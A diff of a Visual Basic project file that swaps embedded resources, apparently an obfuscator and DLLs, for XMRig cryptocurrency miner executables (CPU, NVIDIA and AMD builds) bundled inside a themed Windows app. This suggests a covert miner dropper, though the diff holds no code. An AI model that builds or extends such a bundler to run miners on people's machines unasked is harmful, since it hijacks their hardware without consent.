@@ -96,7 +96,7 @@
       <DependentUpon>Settings.settings</DependentUpon>
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
-    <None Include="Resources\Main_.vb" />
+    <None Include="Resources\Program.vb" />
     <Compile Include="Theme.vb">
       <SubType>Component</SubType>
     </Compile>
@@ -125,9 +125,10 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="Icon.ico" />
-    <None Include="Resources\DLL4.dll" />
-    <None Include="Resources\dotNET_Reactor.exe" />
-    <None Include="Resources\DLL.dll" />
+    <None Include="Resources\xmrig.exe" />
+    <None Include="Resources\xmrig-nvidia.exe" />
+    <None Include="Resources\xmrig-amd-notls.exe" />
+    <None Include="Resources\Project1.dll" />
     <None Include="Resources\nyan.gif" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
